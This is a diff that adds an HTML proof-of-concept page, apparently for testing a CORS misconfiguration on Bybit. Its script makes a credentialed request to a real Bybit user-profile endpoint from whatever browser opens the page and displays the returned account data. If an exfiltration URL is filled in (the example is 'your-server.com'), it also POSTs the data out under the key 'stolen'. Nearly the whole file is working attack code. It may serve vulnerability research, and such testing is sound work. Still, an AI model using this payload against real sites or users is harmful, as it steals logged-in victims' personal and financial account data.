@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CORS PoC - Bybit</title>
+</head>
+<body>
+    <h1>CORS PoC Test</h1>
+    <p>Status: <span id="status">Waiting...</span></p>
+    <pre id="result" style="background:#f0f0f0;padding:10px;white-space:pre-wrap;"></pre>
+
+    <script>
+        // ============================================
+        // Replace TARGET_ENDPOINT with the actual Bybit user info endpoint you want to test
+        // For example: /x-api/user/profile or /x-api/asset/balance
+        // ============================================
+        const TARGET_ENDPOINT = 'https://www.bybit.com/x-api/user/profile';
+
+        // Data exfiltration address (optional). You can leave it blank first and just print the results to the page.
+        // If you want to prove you can send the data out, fill in a server address you control.
+        const EXFIL_URL = ''; // e.g., 'https://your-server.com/log'
+
+        const statusEl = document.getElementById('status');
+        const resultEl = document.getElementById('result');
+
+        statusEl.textContent = 'Sending request...';
+
+        fetch(TARGET_ENDPOINT, {
+            method: 'GET',
+            credentials: 'include',  // Key: bring the user's cookie
+            headers: {
+                'Accept': 'application/json, text/plain, */*'
+            }
+        })
+        .then(response => {
+            statusEl.textContent = 'Request successful, reading response...';
+            return response.text();
+        })
+        .then(data => {
+            statusEl.textContent = 'Success! If you can see user data below, the vulnerability exists.';
+            resultEl.textContent = data;
+
+            // If EXFIL_URL is configured, send the data out
+            if (EXFIL_URL) {
+                fetch(EXFIL_URL, {
+                    method: 'POST',
+                    body: JSON.stringify({ stolen: data }),
+                    headers: { 'Content-Type': 'application/json' }
+                }).catch(() => {});
+            }
+        })
+        .catch(error => {
+            statusEl.textContent = 'Failed: ' + error.message;
+            resultEl.textContent = 'CORS blocked or network error.\n\n' + error.toString();
+        });
+    </script>
+</body>
+</html>
